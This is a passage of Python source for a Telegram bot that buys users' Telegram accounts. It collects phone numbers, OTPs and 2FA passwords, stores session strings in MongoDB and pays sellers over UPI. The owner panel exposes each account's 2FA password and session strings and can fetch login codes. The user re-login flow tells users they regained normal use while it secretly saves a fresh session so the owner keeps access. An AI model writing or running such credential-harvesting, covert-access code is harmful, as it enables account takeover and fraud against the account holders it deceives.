    if not client or not phone:
        await update.message.reply_text("⚠️ Session expired. /login again.")
        return ConversationHandler.END

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=h)
    except SessionPasswordNeededError:
        await update.message.reply_text(
            "🔒 2FA enabled. Password bhejo:", reply_markup=cancel_kb(),
        )
        return RELOGIN_2FA
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ Invalid OTP. Try again (with spaces):", reply_markup=cancel_kb())
        return RELOGIN_OTP
    except Exception as e:
        try: await client.disconnect()
        except: pass
        await update.message.reply_text(f"❌ Login failed: {e}", reply_markup=main_menu_kb())
        return ConversationHandler.END

    return await finalize_relogin(update, context, client)


async def user_relogin_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client: TelegramClient = context.user_data.get("relogin_client")
    if not client:
        await update.message.reply_text("⚠️ Session expired. /login again.")
        return ConversationHandler.END
    try:
        await client.sign_in(password=password)
    except Exception as e:
        await update.message.reply_text(f"❌ Wrong 2FA: {e}\nTry again:", reply_markup=cancel_kb())
        return RELOGIN_2FA
    return await finalize_relogin(update, context, client)


async def finalize_relogin(update, context, client: TelegramClient):
    phone = context.user_data.get("relogin_phone")
    try:
        me = await client.get_me()
    except Exception as e:
        try: await client.disconnect()
        except: pass
        await update.message.reply_text(f"❌ get_me failed: {e}", reply_markup=main_menu_kb())
        return ConversationHandler.END

    new_ts = StringSession.save(client.session)
    try: await client.disconnect()
    except: pass

    # Update stored session so owner tools keep working
    col_accounts.update_one(
        {"phone": phone},
        {"$set": {
            "telethon_string": new_ts,
            "status": "relogged_by_user",
            "relogin_ts": datetime.utcnow().isoformat(),
        }},
    )

    await update.message.reply_text(
        f"✅ <b>Re-login successful</b>\n\n"
        f"Phone: <code>{phone}</code>\n"
        f"Telegram ID: <code>{me.id}</code>\n\n"
        f"Aap ab is account ko normally use kar sakte ho.",
        parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(),
    )
    context.user_data.clear()
    return ConversationHandler.END


# =========================================================
# OWNER /login  (existing feature — access stored session)
# =========================================================
async def owner_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return  # never reached (guard above), but keep safe
    await update.message.reply_text(
        "🔐 <b>Owner Login Panel</b>\n\n"
        "Send the phone number of the account you want to access:\n"
        "Example: <code>+919876543210</code>",
        parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
    )
    return OWNER_LOGIN_PHONE


async def owner_login_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not phone.startswith("+"):
        phone = "+" + phone
    acc = col_accounts.find_one({"phone": phone})
    if not acc:
        await update.message.reply_text("❌ No such account in DB.")
        return ConversationHandler.END

    text = (
        f"🔑 <b>Account access — <code>{phone}</code></b>\n\n"
        f"🌍 Country: {acc['country']}\n"
        f"💵 Price: ₹{acc['price']:.2f}\n"
        f"🔒 2FA: <code>{acc.get('password') or 'None'}</code>\n"
        f"📊 Status: {acc['status']}\n\n"
        f"<b>Pyrogram string:</b>\n<code>{acc.get('pyrogram_string','(none)')}</code>\n\n"
        f"<b>Telethon string:</b>\n<code>{acc.get('telethon_string','')}</code>"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📥 Fetch Last OTP", callback_data=f"fetchotp:{phone}")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    return ConversationHandler.END


# =========================================================
# BALANCE / WITHDRAW
# =========================================================
async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = get_user(update.effective_user.id)
    await update.message.reply_text(
        f"💰 Balance: ₹{u['balance']:.2f}\n"
        f"📦 Accounts sold: {u['sold']}\n"
        f"💳 UPI: {u['upi'] or 'Not set'}",
        parse_mode=ParseMode.HTML, reply_markup=back_kb(),
    )


async def withdraw_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = get_user(uid)

    if update.callback_query:
        q = update.callback_query
        await q.answer()

    if u["balance"] < MIN_WITHDRAW:
        text = (
            f"⚠️ <b>Insufficient balance</b>\n\n"
            f"Your balance: ₹{u['balance']:.2f}\n"
            f"Minimum withdrawal: ₹{MIN_WITHDRAW:.0f}"
        )
        if update.callback_query:
            await update.callback_query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
        else:
            await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
        return ConversationHandler.END

    text = (
        f"🏧 <b>Withdraw Request</b>\n\n"
        f"Available balance: ₹{u['balance']:.2f}\n\n"
        f"Enter the amount you want to withdraw (minimum ₹{MIN_WITHDRAW:.0f}):"
    )
    if update.callback_query:
        # IMPORTANT: send a fresh message rather than edit — this fixes the
        # "no response when amount is typed after button click" bug, because
        # the ConversationHandler needs a message-based state transition to
        # correctly hook the next user text message.
        await update.callback_query.message.reply_text(
            text, parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
        )
    else:
        await update.message.reply_text(
            text, parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
        )
    return WITHDRAW_AMOUNT


async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amt = float(update.message.text.strip().replace("₹", "").replace(",", ""))
    except ValueError:
        await update.message.reply_text("⚠️ Invalid number.", reply_markup=cancel_kb())
        return WITHDRAW_AMOUNT

    u = get_user(update.effective_user.id)
    if amt < MIN_WITHDRAW:
        await update.message.reply_text(
            f"⚠️ Minimum withdrawal is ₹{MIN_WITHDRAW:.0f}.", reply_markup=cancel_kb(),
        )
        return WITHDRAW_AMOUNT
    if amt > u["balance"]:
        await update.message.reply_text(
            f"⚠️ Insufficient balance. You have ₹{u['balance']:.2f}.", reply_markup=cancel_kb(),
        )
        return WITHDRAW_AMOUNT

    context.user_data["w_amount"] = amt
    await update.message.reply_text(
        "💳 Send your UPI ID (e.g. <code>name@upi</code>):",
        parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
    )
    return WITHDRAW_UPI


async def withdraw_upi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    upi = update.message.text.strip()
    if "@" not in upi or len(upi) < 5:
        await update.message.reply_text("⚠️ Invalid UPI ID.", reply_markup=cancel_kb())
        return WITHDRAW_UPI

    uid  = update.effective_user.id
    user = update.effective_user
    amt  = context.user_data["w_amount"]

    # Deduct atomically
    res = col_users.find_one_and_update(
        {"user_id": uid, "balance": {"$gte": amt}},
        {"$inc": {"balance": -amt}, "$set": {"upi": upi}},
        return_document=ReturnDocument.AFTER,
    )
    if not res:
        await update.message.reply_text("⚠️ Balance changed. Try /withdraw again.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    wid = f"WD{next_counter('withdraw'):05d}"
    col_withdrawals.insert_one({
        "wid":      wid,
        "user_id":  uid,
        "amount":   amt,
        "upi":      upi,
        "status":   "pending",
        "ts":       datetime.utcnow().isoformat(),
    })
    push_history(uid, f"{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} | 🏧 Withdraw {wid} ₹{amt:.2f}")

    await update.message.reply_text(
        f"✅ <b>Withdraw request placed</b>\n\n"
        f"🆔 ID: <code>{wid}</code>\n"
        f"💵 Amount: ₹{amt:.2f}\n"
        f"💳 UPI: <code>{upi}</code>\n\n"
        f"You'll be notified once the owner marks it as paid.",
        parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(),
    )

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Payment Done", callback_data=f"paid:{wid}"),
         InlineKeyboardButton("❌ Reject",      callback_data=f"wreject:{wid}")],
    ])
    try:
        await context.bot.send_message(
            OWNER_ID,
            f"🏧 <b>WITHDRAW REQUEST</b>\n\n"
            f"🆔 <code>{wid}</code>\n"
            f"👤 {user.full_name} (@{user.username or '—'}) <code>{user.id}</code>\n"
            f"💵 Amount: ₹{amt:.2f}\n"
            f"💳 UPI: <code>{upi}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb,
        )
    except Exception as e:
        logger.error(f"owner notify err: {e}")
    context.user_data.clear()
    return ConversationHandler.END


async def owner_withdraw_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != OWNER_ID:
        await q.answer("Not authorised.", show_alert=True); return
    await q.answer()
    action, wid = q.data.split(":", 1)
    w = col_withdrawals.find_one({"wid": wid})
    if not w:
        await q.message.reply_text("Not found."); return

    if action == "paid":
        col_withdrawals.update_one({"wid": wid}, {"$set": {"status": "paid"}})
        try:
            await q.message.edit_text(
                (q.message.text_html or "") + "\n\n✅ <b>Marked as PAID.</b>",
                parse_mode=ParseMode.HTML,
            )
        except: pass
        try:
            await context.bot.send_message(
                w["user_id"],
                f"💸 <b>Payment Done!</b>\n\n"
                f"🆔 <code>{wid}</code>\n"
                f"💵 ₹{w['amount']:.2f} sent to <code>{w['upi']}</code>.\n\n"
                f"Thank you for using ZUDO! 🚀",
                parse_mode=ParseMode.HTML,
            )
        except: pass

    elif action == "wreject":
        col_withdrawals.update_one({"wid": wid}, {"$set": {"status": "rejected"}})
        col_users.update_one({"user_id": w["user_id"]}, {"$inc": {"balance": w["amount"]}})
        try:
            await q.message.edit_text(
                (q.message.text_html or "") + "\n\n❌ <b>Rejected — refunded.</b>",
                parse_mode=ParseMode.HTML,
            )
        except: pass
        try:
            await context.bot.send_message(
                w["user_id"],
                f"❌ Your withdraw <code>{wid}</code> was rejected. "
                f"₹{w['amount']:.2f} refunded to your balance.",
                parse_mode=ParseMode.HTML,
            )
        except: pass


# =========================================================
# OWNER COMMANDS — add / deduct / allbal / addcountry / etc.
# =========================================================
def owner_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != OWNER_ID:
            return
        return await func(update, context)
    return wrapper


@owner_only
async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /add <user_id> <amount>")
        return
    try:
        uid = int(context.args[0]); amt = float(context.args[1])
    except ValueError:
        await update.message.reply_text("Invalid arguments.")
        return
    get_user(uid)
    col_users.update_one({"user_id": uid}, {"$inc": {"balance": amt}})
    push_history(uid, f"{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} | 🎁 Owner credit +₹{amt:.2f}")
    await update.message.reply_text(f"✅ Credited ₹{amt:.2f} to user <code>{uid}</code>.", parse_mode=ParseMode.HTML)
    try:
        await context.bot.send_message(uid, f"🎁 Owner ne aapke balance me ₹{amt:.2f} add kiya.")
    except: pass


@owner_only
async def cmd_deduct(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /deduct <user_id> <amount>")
        return
    try:
        uid = int(context.args[0]); amt = float(context.args[1])
    except ValueError:
        await update.message.reply_text("Invalid arguments.")
        return
    get_user(uid)
    col_users.update_one({"user_id": uid}, {"$inc": {"balance": -amt}})
    push_history(uid, f"{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} | ➖ Owner debit -₹{amt:.2f}")
    await update.message.reply_text(f"✅ Deducted ₹{amt:.2f} from user <code>{uid}</code>.", parse_mode=ParseMode.HTML)
    try:
        await context.bot.send_message(uid, f"➖ Owner ne aapke balance se ₹{amt:.2f} deduct kiya.")
    except: pass


@owner_only
async def cmd_allbal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    docs = list(col_users.find({"balance": {"$gte": 1.0}}).sort("balance", -1))
    if not docs:
        await update.message.reply_text("No users with balance ≥ ₹1.")
        return
    lines = ["💰 <b>Users with balance ≥ ₹1</b>\n"]
    total = 0.0
    for d in docs:
        total += float(d.get("balance", 0))
        lines.append(f"• <code>{d['user_id']}</code> — ₹{d['balance']:.2f}  (sold: {d.get('sold',0)})")
    lines.append(f"\n<b>Total held:</b> ₹{total:.2f}  |  Users: {len(docs)}")
    # chunk to avoid 4096 limit
    text = "\n".join(lines)
    for i in range(0, len(text), 3800):
        await update.message.reply_text(text[i:i+3800], parse_mode=ParseMode.HTML)


# ---- add / del / list countries ----
@owner_only
async def cmd_addcountry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🌍 <b>Add Country</b>\n\n"
        "Country name bhejo (with flag emoji if you like).\n"
        "Example: <code>🇺🇸 USA +1</code>\n\n"
        "<i>Format: &lt;name&gt; &lt;+code&gt;</i>",
        parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
    )
    return ADDCOUNTRY_NAME


async def addcountry_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    # Extract +code
    m = re.search(r"(\+\d{1,4})", text)
    if not m:
        await update.message.reply_text(
            "⚠️ Country code (like <code>+1</code>) nahi mila. Format: <code>🇺🇸 USA +1</code>",
            parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
        )
        return ADDCOUNTRY_NAME
    code = m.group(1)
    name = text.replace(code, "").strip() or code

    if find_country(code):
        await update.message.reply_text(
            f"⚠️ <code>{code}</code> already exists. Use /delcountry {code} first, or add different code.",
            parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(),
        )
        return ConversationHandler.END

    context.user_data["new_country_name"] = name
    context.user_data["new_country_code"] = code
    await update.message.reply_text(
        f"✅ Country: <b>{name}</b> ({code})\n\n"
        f"Ab is country ka <b>price ₹ me</b> bhejo. Example: <code>50</code>",
        parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
    )
    return ADDCOUNTRY_PRICE


async def addcountry_price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        price = float(update.message.text.strip().replace("₹", "").replace(",", ""))
        if price <= 0 or price > 100000:
            raise ValueError
    except ValueError:
        await update.message.reply_text("⚠️ Invalid price. Send a number like 50.", reply_markup=cancel_kb())
        return ADDCOUNTRY_PRICE

    name = context.user_data.pop("new_country_name")
    code = context.user_data.pop("new_country_code")

    col_countries.insert_one({
        "code":  code,
        "name":  name,
        "price": price,
        "ts":    datetime.utcnow().isoformat(),
    })
    await update.message.reply_text(
        f"✅ <b>Country added</b>\n\n"
        f"{name} ({code}) — ₹{price:.2f}\n\n"
        f"Ab yeh Sell menu me user ko dikhega.",
        parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(),
    )
    return ConversationHandler.END


@owner_only
async def cmd_delcountry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /delcountry <code>  e.g. /delcountry +1")
        return
    code = context.args[0]
    if not code.startswith("+"):
        code = "+" + code
    r = col_countries.delete_one({"code": code})
    if r.deleted_count:
        await update.message.reply_text(f"🗑 Removed <code>{code}</code>.", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("Not found.")


@owner_only
async def cmd_countries(update: Update, context: ContextTypes.DEFAULT_TYPE):
    docs = list_countries()
    if not docs:
        await update.message.reply_text("No countries configured.")
        return
    lines = ["🌍 <b>Configured countries</b>\n"]
    for c in docs:
        lines.append(f"• {c['name']} ({c['code']}) — ₹{c['price']:.2f}")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


# =========================================================
# CANCEL / HISTORY / STATS
# =========================================================
async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    client = context.user_data.get("client") or context.user_data.get("relogin_client")
    if client:
        try: await client.disconnect()
        except: pass
    context.user_data.clear()
    await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_kb())
    return ConversationHandler.END


async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = get_user(update.effective_user.id)
    hist = u.get("history", [])
    if not hist:
        text = "📜 No history."
    else:
        text = "📜 <b>Recent activity</b>\n\n" + "\n".join(f"• {h}" for h in hist[::-1])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=back_kb())


@owner_only
async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users   = col_users.count_documents({})
    accs    = col_accounts.count_documents({})
    sold    = col_accounts.count_documents({"status": "sold"})
    pending = col_accounts.count_documents({"status": "pending_verification"})
    wd_pend = col_withdrawals.count_documents({"status": "pending"})
    wd_paid_docs = col_withdrawals.find({"status": "paid"})
    wd_paid = sum(w["amount"] for w in wd_paid_docs)
    await update.message.reply_text(
        f"📊 <b>Admin Stats</b>\n\n"
        f"👥 Users: {users}\n"
        f"📱 Accounts received: {accs}\n"
        f"   ✅ Sold: {sold}\n"
        f"   ⏳ Pending: {pending}\n"
        f"🏧 Withdrawals pending: {wd_pend}\n"
        f"💸 Total paid out: ₹{wd_paid:.2f}\n"
        f"📌 In-memory PENDING: {len(PENDING)}",
        parse_mode=ParseMode.HTML,
    )


# =========================================================
# BOOTSTRAP
# =========================================================
def build_app() -> Application:
    app = Application.builder().token(BOT_TOKEN).build()

    sell_conv = ConversationHandler(
        entry_points=[
            CommandHandler("sell", sell_entry),
            CallbackQueryHandler(sell_entry, pattern=r"^sell$"),
        ],
        states={
            SELL_COUNTRY: [
                CallbackQueryHandler(sell_country, pattern=r"^(ctry:.+|cancel)$"),
            ],
            SELL_PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, sell_phone),
                CallbackQueryHandler(menu_cb, pattern=r"^cancel$"),
            ],
            SELL_OTP: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, sell_otp),
                CallbackQueryHandler(menu_cb, pattern=r"^cancel$"),
            ],
            SELL_2FA: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, sell_2fa_password),
                CallbackQueryHandler(menu_cb, pattern=r"^cancel$"),
            ],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        per_message=False,
    )

    wd_conv = ConversationHandler(
        entry_points=[
            CommandHandler("withdraw", withdraw_entry),
            CallbackQueryHandler(withdraw_entry, pattern=r"^withdraw$"),
        ],
        states={
            WITHDRAW_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_amount),
                CallbackQueryHandler(menu_cb, pattern=r"^cancel$"),
            ],
            WITHDRAW_UPI: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_upi),
                CallbackQueryHandler(menu_cb, pattern=r"^cancel$"),
            ],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        per_message=False,
    )

    login_conv = ConversationHandler(
        entry_points=[CommandHandler("login", user_relogin_entry)],
        states={
            OWNER_LOGIN_PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, owner_login_phone),
                CallbackQueryHandler(menu_cb, pattern=r"^cancel$"),
            ],
            RELOGIN_PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, user_relogin_phone),
                CallbackQueryHandler(menu_cb, pattern=r"^cancel$"),
            ],
            RELOGIN_OTP: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, user_relogin_otp),
                CallbackQueryHandler(relogin_fetch_otp_cb, pattern=r"^reotp:"),
                CallbackQueryHandler(menu_cb, pattern=r"^cancel$"),
            ],
            RELOGIN_2FA: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, user_relogin_2fa),
                CallbackQueryHandler(menu_cb, pattern=r"^cancel$"),
            ],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        per_message=False,
    )

    addcountry_conv = ConversationHandler(
        entry_points=[CommandHandler("addcountry", cmd_addcountry)],
        states={
            ADDCOUNTRY_NAME: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, addcountry_name),
                CallbackQueryHandler(menu_cb, pattern=r"^cancel$"),
            ],
            ADDCOUNTRY_PRICE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, addcountry_price),
                CallbackQueryHandler(menu_cb, pattern=r"^cancel$"),
            ],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        per_message=False,
    )

    # order matters: specific conversations first
    app.add_handler(sell_conv)
    app.add_handler(wd_conv)
    app.add_handler(login_conv)
    app.add_handler(addcountry_conv)

    app.add_handler(CommandHandler("start",     cmd_start))
    app.add_handler(CommandHandler("help",      cmd_help))
    app.add_handler(CommandHandler("balance",   cmd_balance))
    app.add_handler(CommandHandler("history",   cmd_history))
    app.add_handler(CommandHandler("cancel",    cmd_cancel))
    app.add_handler(CommandHandler("stats",     cmd_stats))
    app.add_handler(CommandHandler("add",       cmd_add))
    app.add_handler(CommandHandler("deduct",    cmd_deduct))
    app.add_handler(CommandHandler("allbal",    cmd_allbal))
    app.add_handler(CommandHandler("delcountry",cmd_delcountry))
    app.add_handler(CommandHandler("countries", cmd_countries))

    app.add_handler(CallbackQueryHandler(retry_cb, pattern=r"^retry:"))
    app.add_handler(CallbackQueryHandler(abort_cb, pattern=r"^abort:"))
    app.add_handler(CallbackQueryHandler(owner_action_cb,   pattern=r"^(approve|reject|fetchotp):"))
    app.add_handler(CallbackQueryHandler(owner_withdraw_cb, pattern=r"^(paid|wreject):"))

    # fallback menu router — MUST be last
    app.add_handler(CallbackQueryHandler(menu_cb))

    return app


def main():
    app = build_app()
    logger.info("🚀 ZUDO Account Seller Bot (v4 — MongoDB) is running…")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
